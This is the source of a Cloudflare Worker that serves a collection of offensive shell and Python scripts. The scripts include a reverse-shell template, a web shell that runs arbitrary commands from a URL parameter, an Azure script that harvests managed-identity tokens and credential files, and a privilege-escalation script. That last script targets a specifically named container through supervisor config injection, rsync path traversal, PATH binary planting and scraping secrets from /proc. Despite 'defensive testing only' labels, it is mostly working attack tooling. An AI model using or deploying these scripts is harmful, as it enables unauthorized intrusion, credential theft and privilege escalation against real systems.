// Shell Scripts Repository - Cloudflare Worker
// Simple file serving for shell scripts

const STATIC_FILES = {
  'basic-info': `#!/bin/bash
# Basic System Information Script
# FOR DEFENSIVE SECURITY TESTING ONLY

echo "=== Basic System Enumeration ==="
echo "Script started: $(date)"
echo "Hostname: $(hostname)"

echo "=== System Information ==="
echo "Kernel: $(uname -r)"
echo "Architecture: $(uname -m)"
echo "Hostname: $(hostname)"
echo "Uptime: $(uptime)"

echo "=== User Context ==="
echo "Current user: $(whoami) ($(id))"
echo "Shell: $SHELL"
echo "Path: $PATH"

echo "=== Network Interfaces ==="
ip addr show 2>/dev/null || ifconfig 2>/dev/null

echo "=== Listening Services ==="
ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null

echo "=== Running Processes ==="
ps aux 2>/dev/null | head -20

echo "=== Enumeration Complete ==="`,

  'advanced-info': `#!/bin/bash
# Advanced System Information Script
# FOR DEFENSIVE SECURITY TESTING ONLY

echo "=== Advanced System Information ==="
echo "Script started: $(date)"
echo "Hostname: $(hostname)"

echo "=== Detailed System Information ==="
echo "Kernel version: $(uname -r)"
echo "Architecture: $(uname -m)"
echo "Operating System: $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '"' || uname -s)"
echo "Hardware: $(cat /sys/devices/virtual/dmi/id/product_name 2>/dev/null || echo 'N/A')"
echo "CPU info: $(cat /proc/cpuinfo 2>/dev/null | grep 'model name' | head -1 | cut -d: -f2 | sed 's/^ *//' || echo 'N/A')"
echo "CPU cores: $(nproc 2>/dev/null || echo 'N/A')"
echo "Total memory: $(free -h 2>/dev/null | awk '/^Mem/ {print $2}' || echo 'N/A')"
echo "Available memory: $(free -h 2>/dev/null | awk '/^Mem/ {print $7}' || echo 'N/A')"

echo "=== Environment Variables ==="
env | grep -E "^(PATH|HOME|USER|SHELL|PWD|LANG|TZ)" | head -10 || echo "Environment variables not accessible"

echo "=== Container/Virtualization Detection ==="
if [ -f "/.dockerenv" ]; then echo "[DETECTED] Docker container"; fi
if [ -f "/proc/1/cgroup" ]; then
  if grep -qa docker /proc/1/cgroup 2>/dev/null; then echo "[DETECTED] Docker container"; fi
  if grep -qa lxc /proc/1/cgroup 2>/dev/null; then echo "[DETECTED] LXC container"; fi
fi
if command -v systemd-detect-virt >/dev/null 2>&1; then
  virt=$(systemd-detect-virt 2>/dev/null)
  if [ "$virt" != "none" ] && [ ! -z "$virt" ]; then echo "[DETECTED] Virtualization: $virt"; fi
fi

echo "=== File System Information ==="
echo "Mounted filesystems:"
mount 2>/dev/null | head -5 || df 2>/dev/null | head -5
echo "Disk usage by filesystem:"
df -h 2>/dev/null | head -5
echo "Inode usage:"
df -i 2>/dev/null | head -5

echo "=== Network Configuration ==="
echo "Routing table:"
ip route 2>/dev/null | head -5 || route -n 2>/dev/null | head -5
echo "DNS configuration:"
cat /etc/resolv.conf 2>/dev/null | head -5 || echo "DNS config not accessible"
echo "Network connections:"
ss -tuln 2>/dev/null | head -10 || netstat -tuln 2>/dev/null | head -10
echo "ARP table:"
ip neigh 2>/dev/null | head -5 || arp -a 2>/dev/null | head -5

echo "=== Advanced Information Complete ==="
echo "Scan finished: $(date)"`,

  'network-test': `#!/bin/bash
# Network Connectivity Template - FOR DEFENSIVE TESTING ONLY

# Configuration
TARGET_IP="YOUR_IP_HERE"
TARGET_PORT="4444"

echo "=== Network Connectivity Test ==="
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "WARNING: This is for authorized testing only!"

# Test various network methods
echo "Testing netcat connectivity..."
if command -v nc >/dev/null 2>&1; then
    echo "Netcat available - would execute: nc $TARGET_IP $TARGET_PORT"
else
    echo "Netcat not available"
fi

echo "Testing bash connectivity..."
echo "Would test: /dev/tcp/$TARGET_IP/$TARGET_PORT"

echo "Testing python connectivity..."
if command -v python3 >/dev/null 2>&1; then
    echo "Python3 available for network testing"
elif command -v python >/dev/null 2>&1; then
    echo "Python2 available for network testing"
else
    echo "Python not available"
fi

echo "=== Test Complete - No actual connections made ==="
echo "Replace YOUR_IP_HERE with actual target IP for testing"`,

  'service-probe': `#!/bin/bash
# Service Probe Script - FOR DEFENSIVE TESTING ONLY
# Analyzes exposed services for potential security gaps

echo "=== Service Probe Analysis ==="
echo "Started: $(date)"
echo "Host: $(hostname)"

# Define target ports from previous scan results
PORTS=(873 8888 9000 1384)

echo ""
echo "=== Port Analysis ==="
for port in "\${PORTS[@]}"; do
    echo "--- Port $port Analysis ---"
    
    # Check if port is listening
    if command -v ss >/dev/null 2>&1; then
        ss -tuln | grep ":$port " && echo "[INFO] Port $port is listening"
    elif command -v netstat >/dev/null 2>&1; then
        netstat -tuln | grep ":$port " && echo "[INFO] Port $port is listening"
    fi
    
    # Service identification
    case $port in
        873)
            echo "[SERVICE] Port 873 typically runs rsync daemon"
            if command -v rsync >/dev/null 2>&1; then
                echo "[CHECK] Testing rsync modules..."
                timeout 5 rsync --list-only rsync://localhost/ 2>/dev/null || echo "[TIMEOUT] Rsync connection timed out"
            fi
            ;;
        8888)
            echo "[SERVICE] Port 8888 often runs Jupyter notebooks"
            echo "[CHECK] Testing HTTP response..."
            timeout 3 bash -c "echo | nc localhost $port" 2>/dev/null && echo "[RESPONSE] Got response from port $port"
            ;;
        9000)
            echo "[SERVICE] Port 9000 - checking service type..."
            timeout 3 bash -c "echo | nc localhost $port" 2>/dev/null && echo "[RESPONSE] Got response from port $port"
            ;;
        1384)
            echo "[SERVICE] Port 1384 - checking service type..."
            timeout 3 bash -c "echo | nc localhost $port" 2>/dev/null && echo "[RESPONSE] Got response from port $port"
            ;;
    esac
    
    echo ""
done

echo "=== Probe Complete ==="
echo "Finished: $(date)"`,

  'web-shell': `#!/usr/bin/env python3
# Simple Command API Server - GET Request Version
# FOR DEFENSIVE SECURITY TESTING ONLY

import http.server
import socketserver
import subprocess
import json
import os
import urllib.parse

class CommandAPIHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        """Handle command execution via GET request"""
        # Parse URL and query parameters
        parsed_url = urllib.parse.urlparse(self.path)
        
        if parsed_url.path == '/api/command':
            # Get command from query parameter
            query_params = urllib.parse.parse_qs(parsed_url.query)
            command = query_params.get('cmd', [''])[0].strip()
            
            if not command:
                self.send_json_response({'error': 'No command provided. Use ?cmd=your_command'}, 400)
                return
            
            # Execute command
            try:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                # Combine stdout and stderr
                output = result.stdout
                if result.stderr:
                    output += result.stderr
                
                response_data = {
                    'command': command,
                    'output': output or '(No output)',
                    'return_code': result.returncode,
                    'success': result.returncode == 0
                }
                
                self.send_json_response(response_data)
                
            except subprocess.TimeoutExpired:
                self.send_json_response({
                    'error': 'Command timed out (30s limit)',
                    'command': command
                }, 408)
            
            except Exception as e:
                self.send_json_response({
                    'error': f'Execution error: {str(e)}',
                    'command': command
                }, 500)
        
        elif parsed_url.path == '/':
            # Simple info page
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            
            html = f"""
            <h1>🔧 Simple Command API</h1>
            <p><strong>Endpoint:</strong> <code>/api/command?cmd=YOUR_COMMAND</code></p>
            <p><strong>Example:</strong> <a href="/api/command?cmd=pwd">/api/command?cmd=pwd</a></p>
            <p><strong>Working Directory:</strong> {os.getcwd()}</p>
            <p style="color: red;"><strong>⚠️ WARNING:</strong> Only use on trusted networks!</p>
            """
            self.wfile.write(html.encode('utf-8'))
        
        else:
            self.send_json_response({'error': 'Endpoint not found'}, 404)
    
    def send_json_response(self, data, status_code=200):
        """Send JSON response with CORS headers"""
        self.send_response(status_code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data, indent=2).encode('utf-8'))
    
    def log_message(self, format, *args):
        """Simple logging"""
        print(f"[{self.date_time_string()}] {format % args}")

def main():
    PORT = int(os.environ.get('PORT', 8881))
    
    print("🔧 Simple Command API Server (GET)")
    print(f"📡 Starting on port {PORT}")
    print(f"📍 Working directory: {os.getcwd()}")
    print(f"🌐 API endpoint: http://localhost:{PORT}/api/command?cmd=COMMAND")
    print("\\n📝 Usage Examples:")
    print(f"  http://localhost:{PORT}/api/command?cmd=pwd")
    print(f"  http://localhost:{PORT}/api/command?cmd=ls%20-la")
    print(f"  curl 'http://localhost:{PORT}/api/command?cmd=whoami'")
    print("\\n⚠️  WARNING: Only use on trusted networks!")
    
    try:
        with socketserver.TCPServer(("", PORT), CommandAPIHandler) as httpd:
            print(f"\\n✅ Server running on port {PORT}")
            print("Press Ctrl+C to stop")
            httpd.serve_forever()
    except KeyboardInterrupt:
        print("\\n🛑 Server stopped")
    except Exception as e:
        print(f"\\n❌ Error: {e}")

if __name__ == "__main__":
    main()`,

  'azure-enum': `#!/bin/bash

# Azure Container IAM and Metadata Enumeration Script
# Usage: ./azure_enum.sh [output_file]

OUTPUT_FILE="\${1:-azure_enum_$(date +%Y%m%d_%H%M%S).txt}"
TIMESTAMP=$(date)

# Colors for output
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
BLUE='\\033[0;34m'
NC='\\033[0m' # No Color

log() {
    echo -e "$1" | tee -a "$OUTPUT_FILE"
}

log_section() {
    echo "" | tee -a "$OUTPUT_FILE"
    echo "========================================" | tee -a "$OUTPUT_FILE"
    echo "$1" | tee -a "$OUTPUT_FILE"
    echo "========================================" | tee -a "$OUTPUT_FILE"
}

run_cmd() {
    local cmd="$1"
    local description="$2"
    
    log "\${BLUE}[INFO]\${NC} $description"
    log "\${YELLOW}Command:\${NC} $cmd"
    log "---"
    
    eval "$cmd" 2>&1 | tee -a "$OUTPUT_FILE"
    echo "" | tee -a "$OUTPUT_FILE"
}

log "\${GREEN}Azure Container IAM Enumeration\${NC}"
log "Started: $TIMESTAMP"
log "Container: chrome-operator-debian-alpha"
log "Build: openaiappliedcaasprod.azurecr.io/chrome-operator-debian-alpha:20250722034337-5994535d7051-linux-amd64"

# Azure Instance Metadata Service (IMDS) - Primary method
log_section "AZURE INSTANCE METADATA SERVICE (IMDS)"

# Check if IMDS is accessible
log "\${BLUE}[INFO]\${NC} Testing IMDS connectivity..."
if timeout 10 curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" >/dev/null 2>&1; then
    log "\${GREEN}[SUCCESS]\${NC} IMDS is accessible"
    
    # Get instance metadata
    run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool 2>/dev/null || curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"' "Instance Metadata"
    
    # Get compute metadata specifically
    run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01" | python3 -m json.tool 2>/dev/null || curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01"' "Compute Metadata"
    
    # Get network metadata
    run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01" | python3 -m json.tool 2>/dev/null || curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01"' "Network Metadata"
    
    # Try to get access token (if managed identity is enabled)
    log_section "AZURE MANAGED IDENTITY"
    run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | python3 -m json.tool 2>/dev/null || curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"' "Management API Access Token"
    
    # Try different resource endpoints
    run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" | python3 -m json.tool 2>/dev/null || curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"' "Storage API Access Token"
    
    run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" | python3 -m json.tool 2>/dev/null || curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/"' "Key Vault Access Token"
    
    run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" | python3 -m json.tool 2>/dev/null || curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"' "Microsoft Graph Access Token"
    
else
    log "\${RED}[ERROR]\${NC} IMDS not accessible or filtered"
fi

# Check for Azure CLI
log_section "AZURE CLI ENUMERATION"
if command -v az >/dev/null 2>&1; then
    log "\${GREEN}[SUCCESS]\${NC} Azure CLI found"
    
    run_cmd "az --version" "Azure CLI Version"
    run_cmd "az account show" "Current Account"
    run_cmd "az account list" "All Accounts"
    run_cmd "az ad signed-in-user show" "Current User"
    run_cmd "az role assignment list --assignee \\$(az ad signed-in-user show --query objectId -o tsv)" "Role Assignments"
    run_cmd "az group list" "Resource Groups"
    run_cmd "az vm list" "Virtual Machines"
    run_cmd "az storage account list" "Storage Accounts"
    run_cmd "az keyvault list" "Key Vaults"
else
    log "\${YELLOW}[INFO]\${NC} Azure CLI not found"
fi

# Check for environment variables with Azure credentials
log_section "AZURE ENVIRONMENT VARIABLES"
run_cmd 'env | grep -i azure' "Azure Environment Variables"
run_cmd 'env | grep -i client' "Client Environment Variables"  
run_cmd 'env | grep -i tenant' "Tenant Environment Variables"
run_cmd 'env | grep -i subscription' "Subscription Environment Variables"
run_cmd 'env | grep -i secret' "Secret Environment Variables"
run_cmd 'env | grep -i key' "Key Environment Variables"

# Check for Azure credential files
log_section "AZURE CREDENTIAL FILES"
run_cmd 'find / -name "*azure*" -type f 2>/dev/null | head -20' "Azure-related Files"
run_cmd 'find /home -name ".azure" -type d 2>/dev/null' "Azure CLI Config Directories"
run_cmd 'ls -la ~/.azure/ 2>/dev/null || echo "No .azure directory found"' "Azure CLI Config"
run_cmd 'cat ~/.azure/config 2>/dev/null || echo "No Azure config file"' "Azure CLI Configuration"
run_cmd 'ls -la /var/lib/waagent/ 2>/dev/null || echo "No waagent directory"' "Azure Linux Agent"

# Check for service principal files
run_cmd 'find / -name "*service*principal*" -o -name "*client*secret*" -o -name "*tenant*" 2>/dev/null | grep -v proc' "Service Principal Files"

# Check for Kubernetes service account (if in AKS)
log_section "KUBERNETES SERVICE ACCOUNT (AKS)"
run_cmd 'ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null || echo "Not in Kubernetes"' "K8s Service Account"
run_cmd 'cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "No K8s token"' "K8s Token"
run_cmd 'cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "No K8s namespace"' "K8s Namespace"

# Check for mounted Azure Storage
log_section "AZURE STORAGE MOUNTS"
run_cmd 'mount | grep -i azure' "Azure Storage Mounts"
run_cmd 'df -h | grep -i azure' "Azure Storage Usage"

# Try to access container registry info
log_section "CONTAINER REGISTRY INFO"
run_cmd 'echo "Container registry: openaiappliedcaasprod.azurecr.io"' "Registry Information"
run_cmd 'nslookup openaiappliedcaasprod.azurecr.io 2>/dev/null || echo "DNS lookup failed"' "Registry DNS"

# Check for Docker credentials
run_cmd 'cat ~/.docker/config.json 2>/dev/null || echo "No Docker config"' "Docker Credentials"
run_cmd 'ls -la /root/.docker/ 2>/dev/null || echo "No root Docker config"' "Root Docker Config"

# Network reconnaissance for Azure services
log_section "NETWORK RECONNAISSANCE"
run_cmd 'curl -s --connect-timeout 5 https://management.azure.com/ | head -5 2>/dev/null || echo "Cannot reach Azure Management API"' "Azure Management API"
run_cmd 'curl -s --connect-timeout 5 https://openaiappliedcaasprod.azurecr.io/v2/ | head -5 2>/dev/null || echo "Cannot reach Container Registry"' "Container Registry API"

# Check for MSI endpoint variations
log_section "MSI ENDPOINT VARIATIONS"
run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity?api-version=2018-02-01" 2>/dev/null || echo "MSI identity endpoint not accessible"' "MSI Identity Endpoint"
run_cmd 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/info?api-version=2018-02-01" 2>/dev/null || echo "MSI info endpoint not accessible"' "MSI Info Endpoint"

# Container-specific checks
log_section "CONTAINER ANALYSIS"
run_cmd 'cat /.dockerenv 2>/dev/null || echo "Not a Docker container or no .dockerenv"' "Docker Environment"
run_cmd 'cat /proc/1/cgroup | grep -i azure' "Azure Container Groups"
run_cmd 'hostname' "Container Hostname"
run_cmd 'cat /etc/hostname' "Hostname File"

# Check for any Azure-related processes
log_section "AZURE PROCESSES"
run_cmd 'ps aux | grep -i azure' "Azure Processes"
run_cmd 'ps aux | grep -i waagent' "Azure Linux Agent Process"

log ""
log "\${GREEN}[COMPLETE]\${NC} Azure enumeration finished at $(date)"
log "\${BLUE}[INFO]\${NC} Results saved to: $OUTPUT_FILE"

# Create a summary
SUMMARY_FILE="azure_summary_$(date +%Y%m%d_%H%M%S).txt"
echo "Azure Enumeration Summary - $(date)" > "$SUMMARY_FILE"
echo "Container: chrome-operator-debian-alpha" >> "$SUMMARY_FILE"
echo "Registry: openaiappliedcaasprod.azurecr.io" >> "$SUMMARY_FILE"
echo "" >> "$SUMMARY_FILE"
echo "Key Findings:" >> "$SUMMARY_FILE"
grep -i "error\\|success\\|token\\|access" "$OUTPUT_FILE" | head -10 >> "$SUMMARY_FILE"

log "\${BLUE}[INFO]\${NC} Summary saved to: $SUMMARY_FILE"`,

  'privesc': `#!/bin/bash

OUTPUT_FILE="privesc_$(date +%Y%m%d_%H%M%S).log"
TIMESTAMP=$(date)

# Colors
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
BLUE='\\033[0;34m'
NC='\\033[0m'

log() {
    echo -e "$1" | tee -a "$OUTPUT_FILE"
}

log_attack() {
    echo "" | tee -a "$OUTPUT_FILE"
    echo "===========================================" | tee -a "$OUTPUT_FILE"
    echo "ATTACK: $1" | tee -a "$OUTPUT_FILE"
    echo "===========================================" | tee -a "$OUTPUT_FILE"
}

test_cmd() {
    local cmd="$1"
    local description="$2"
    
    log "\${BLUE}[TEST]\${NC} $description"
    log "\${YELLOW}Command:\${NC} $cmd"
    
    if eval "$cmd" >> "$OUTPUT_FILE" 2>&1; then
        log "\${GREEN}[SUCCESS]\${NC} Command executed successfully"
        return 0
    else
        log "\${RED}[FAILED]\${NC} Command failed"
        return 1
    fi
}

exploit_cmd() {
    local cmd="$1"
    local description="$2"
    
    log "\${RED}[EXPLOIT]\${NC} $description"
    log "\${YELLOW}Command:\${NC} $cmd"
    
    eval "$cmd" | tee -a "$OUTPUT_FILE"
}

log "\${GREEN}Container Privilege Escalation Script\${NC}"
log "Started: $TIMESTAMP"
log "Target: chrome-operator-debian-alpha container"

# ==========================================
# ATTACK 1: Supervisor Control
# ==========================================
log_attack "Supervisor Control Interface"

log "\${BLUE}[INFO]\${NC} Testing supervisor access..."
if test_cmd "supervisorctl status" "Check supervisor status"; then
    log "\${GREEN}[FOUND]\${NC} Supervisor control is accessible!"
    
    # Try to restart services that run as root
    log "\${BLUE}[INFO]\${NC} Attempting to restart root services..."
    
    # Services that run as root (no user= specified)
    ROOT_SERVICES=("notebook_server" "rsync_daemon" "sync_share" "chromium" "policy_merge" "certs" "mitmproxy" "test_server" "apply_patch" "container_daemon")
    
    for service in "\${ROOT_SERVICES[@]}"; do
        log "\${BLUE}[TEST]\${NC} Trying to control service: $service"
        test_cmd "supervisorctl status $service" "Check $service status"
        test_cmd "supervisorctl restart $service" "Restart $service"
    done
    
    # Try to add new program
    log "\${BLUE}[EXPLOIT]\${NC} Attempting to add malicious service..."
    exploit_cmd 'echo "[program:privesc]
command=/bin/bash -c \\"echo root > /tmp/privesc_test && chmod 777 /tmp/privesc_test\\"
autostart=true
user=root" | tee /tmp/malicious_service.conf' "Create malicious service config"
    
else
    log "\${RED}[FAILED]\${NC} No supervisor access"
fi

# ==========================================
# ATTACK 2: Init Script Manipulation
# ==========================================
log_attack "Init Script File Permissions"

INIT_DIR="/usr/local/init_scripts"
log "\${BLUE}[INFO]\${NC} Checking init script permissions..."

exploit_cmd "ls -la $INIT_DIR" "List init scripts"

# Check if any scripts are writable
ROOT_SCRIPTS=("notebook_server.sh" "rsync_daemon.sh" "sync_share.sh" "policy_merge.sh" "certs.sh" "mitmproxy.sh" "test_server.sh" "apply_patch.sh" "container_daemon.sh")

for script in "\${ROOT_SCRIPTS[@]}"; do
    if [ -w "$INIT_DIR/$script" ]; then
        log "\${GREEN}[VULNERABLE]\${NC} $script is writable!"
        
        # Backup original
        exploit_cmd "cp $INIT_DIR/$script $INIT_DIR/$script.backup" "Backup original script"
        
        # Inject privilege escalation
        exploit_cmd "echo '#!/bin/bash
# Privilege escalation payload
echo \\"Privilege escalation successful at \\$(date)\\" > /tmp/root_access
chmod 777 /tmp/root_access
whoami > /tmp/current_user
id > /tmp/current_id
# Continue with original script
' > /tmp/malicious_script.sh" "Create malicious script"
        
        log "\${RED}[EXPLOIT]\${NC} Script $script can be modified for privilege escalation!"
    else
        log "\${BLUE}[INFO]\${NC} $script is not writable"
    fi
done

# ==========================================
# ATTACK 3: rsync Directory Traversal
# ==========================================
log_attack "rsync Directory Traversal"

log "\${BLUE}[INFO]\${NC} Testing rsync write capabilities..."

# Test basic rsync access
if test_cmd "rsync --list-only rsync://localhost:873/share/" "List rsync share"; then
    log "\${GREEN}[FOUND]\${NC} rsync is accessible!"
    
    # Try directory traversal to overwrite system files
    log "\${BLUE}[EXPLOIT]\${NC} Attempting directory traversal attacks..."
    
    # Create test payload
    exploit_cmd 'echo "#!/bin/bash
echo \\"Root access gained via rsync at \\$(date)\\" > /tmp/rsync_privesc
whoami >> /tmp/rsync_privesc
id >> /tmp/rsync_privesc
" > /tmp/malicious_payload.sh && chmod +x /tmp/malicious_payload.sh' "Create rsync payload"
    
    # Try to overwrite init scripts via rsync
    for script in "\${ROOT_SCRIPTS[@]}"; do
        log "\${BLUE}[TEST]\${NC} Attempting to overwrite $script via rsync..."
        test_cmd "rsync -av /tmp/malicious_payload.sh rsync://localhost:873/share/../../../usr/local/init_scripts/$script" "Overwrite $script"
    done
    
    # Try to overwrite supervisor config
    log "\${BLUE}[TEST]\${NC} Attempting to overwrite supervisor config..."
    test_cmd "rsync -av /tmp/malicious_payload.sh rsync://localhost:873/share/../../../etc/supervisord.conf" "Overwrite supervisord.conf"
    
    # Try to write to sensitive directories
    SENSITIVE_DIRS=("etc" "root" "usr/local/bin" "var/log")
    for dir in "\${SENSITIVE_DIRS[@]}"; do
        log "\${BLUE}[TEST]\${NC} Testing write access to /$dir..."
        test_cmd "echo 'test' | rsync --stdin rsync://localhost:873/share/../../../$dir/privesc_test" "Write to /$dir"
    done
    
else
    log "\${RED}[FAILED]\${NC} rsync not accessible"
fi

# ==========================================
# ATTACK 4: Jupyter Code Execution
# ==========================================
log_attack "Jupyter Notebook Exploitation"

log "\${BLUE}[INFO]\${NC} Testing Jupyter access..."

# Test if Jupyter is accessible
if test_cmd "curl -s http://localhost:8888/ | head -5" "Check Jupyter accessibility"; then
    log "\${GREEN}[FOUND]\${NC} Jupyter is accessible!"
    
    # Create Python payload for file system manipulation
    exploit_cmd 'cat > /tmp/jupyter_exploit.py << '"'"'EOF'"'"'
import os
import subprocess
import sys

# Try to write to system directories
print("=== Jupyter Privilege Escalation Test ===")
print(f"Current user: {os.getenv('"'"'USER'"'"')}")
print(f"Current working directory: {os.getcwd()}")

# Try to execute system commands
try:
    result = subprocess.run(['"'"'whoami'"'"'], capture_output=True, text=True)
    print(f"whoami output: {result.stdout.strip()}")
except Exception as e:
    print(f"Error running whoami: {e}")

# Try to write to /tmp with different permissions
try:
    with open('"'"'/tmp/jupyter_privesc_test'"'"', '"'"'w'"'"') as f:
        f.write("Jupyter code execution successful\\n")
    print("Successfully wrote to /tmp")
except Exception as e:
    print(f"Error writing to /tmp: {e}")

# Try to read sensitive files
sensitive_files = ['"'"'/etc/shadow'"'"', '"'"'/etc/passwd'"'"', '"'"'/root/.bashrc'"'"']
for file in sensitive_files:
    try:
        with open(file, '"'"'r'"'"') as f:
            content = f.read()[:100]  # First 100 chars
            print(f"Can read {file}: {len(content)} chars")
    except Exception as e:
        print(f"Cannot read {file}: {e}")

# Try to modify supervisor scripts
init_scripts = ['"'"'/usr/local/init_scripts/notebook_server.sh'"'"', 
                '"'"'/usr/local/init_scripts/rsync_daemon.sh'"'"']
for script in init_scripts:
    try:
        with open(script, '"'"'r'"'"') as f:
            content = f.read()
            print(f"Can read {script}: {len(content)} chars")
        
        # Try to write
        with open(script, '"'"'a'"'"') as f:
            f.write("\\n# Jupyter modification test\\n")
            print(f"Successfully modified {script}")
    except Exception as e:
        print(f"Cannot modify {script}: {e}")
EOF' "Create Jupyter exploitation script"
    
    log "\${BLUE}[INFO]\${NC} Jupyter payload created. Manual execution required:"
    log "1. Access http://localhost:8888 in browser"
    log "2. Create new Python notebook"
    log "3. Copy and execute the content of /tmp/jupyter_exploit.py"
    
else
    log "\${RED}[FAILED]\${NC} Jupyter not accessible"
fi

# ==========================================
# ATTACK 5: Environment Variable Exploitation
# ==========================================
log_attack "Environment Variable Exploitation"

log "\${BLUE}[INFO]\${NC} Checking for exploitable environment variables..."

# Check MITM proxy credentials
exploit_cmd "env | grep MITM" "MITM environment variables"

# Check for PATH manipulation possibilities
exploit_cmd "echo \\$PATH" "Current PATH"

# Try to create malicious binaries in PATH directories
PATH_DIRS=$(echo $PATH | tr ':' '\\n')
for dir in $PATH_DIRS; do
    if [ -w "$dir" ]; then
        log "\${GREEN}[VULNERABLE]\${NC} $dir is writable in PATH!"
        exploit_cmd "echo '#!/bin/bash
echo \\"PATH exploitation successful\\" > /tmp/path_exploit
whoami >> /tmp/path_exploit
' > $dir/malicious_binary && chmod +x $dir/malicious_binary" "Create malicious binary in $dir"
    fi
done

# ==========================================
# ATTACK 6: Process Injection via /proc
# ==========================================
log_attack "Process Memory Analysis"

log "\${BLUE}[INFO]\${NC} Analyzing running processes for exploitation..."

# Look for processes running as root
exploit_cmd "ps aux | grep root | head -10" "Root processes"

# Check process environments for credentials
ROOT_PIDS=$(ps aux | grep root | grep -v '\\[' | awk '{print $2}' | head -5)
for pid in $ROOT_PIDS; do
    if [ -r "/proc/$pid/environ" ]; then
        log "\${BLUE}[INFO]\${NC} Checking environment of PID $pid..."
        exploit_cmd "cat /proc/$pid/environ | tr '\\\\0' '\\\\n' | grep -E '(SECRET|KEY|TOKEN|PASSWORD)'" "Environment of PID $pid"
    fi
done

# ==========================================
# SUMMARY AND RECOMMENDATIONS
# ==========================================
log ""
log "=========================================="
log "PRIVILEGE ESCALATION SUMMARY"
log "=========================================="

log "\${BLUE}[INFO]\${NC} Exploitation attempts completed at $(date)"
log "\${BLUE}[INFO]\${NC} Results logged to: $OUTPUT_FILE"

# Check if any exploits were successful
if [ -f "/tmp/privesc_test" ] || [ -f "/tmp/rsync_privesc" ] || [ -f "/tmp/jupyter_privesc_test" ]; then
    log "\${GREEN}[SUCCESS]\${NC} Potential privilege escalation achieved! Check /tmp/ for evidence."
else
    log "\${YELLOW}[INFO]\${NC} No immediate privilege escalation detected."
fi

log ""
log "\${BLUE}Next steps:\${NC}"
log "1. Check supervisor logs: tail -f /var/log/chrome.supervisord.log"
log "2. Monitor service restarts for exploitation opportunities"
log "3. Use Jupyter notebook for interactive privilege escalation"
log "4. Examine /tmp/ directory for exploitation artifacts"

# Create a quick reference
cat > /tmp/privesc_commands.txt << 'EOF'
# Quick Privilege Escalation Commands

# Supervisor control
supervisorctl status
supervisorctl restart notebook_server

# rsync exploitation
rsync --list-only rsync://localhost:873/share/
echo "payload" | rsync --stdin rsync://localhost:873/share/../../../tmp/test

# File permission checks
ls -la /usr/local/init_scripts/
find /usr/local -perm -002 -type f

# Process analysis
ps aux | grep root
cat /proc/*/environ | grep -i secret

# Jupyter access
curl http://localhost:8888/
EOF

log "\${BLUE}[INFO]\${NC} Quick reference saved to: /tmp/privesc_commands.txt"`
};

// Function to get HTML content (files page only)
async function getHTMLContent() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shell Scripts Repository</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
        }
        .container {
            background: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            backdrop-filter: blur(10px);
        }
        h1 {
            color: #4A90E2;
            text-align: center;
            margin-bottom: 10px;
            font-size: 2.5em;
            background: linear-gradient(45deg, #4A90E2, #9B59B6);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
            font-style: italic;
        }
        .files-section {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            border-left: 4px solid #6c5ce7;
        }
        .files-list {
            list-style: none;
            padding: 0;
            margin: 15px 0 0 0;
        }
        .file-item {
            background: white;
            margin-bottom: 8px;
            padding: 12px 15px;
            border-radius: 6px;
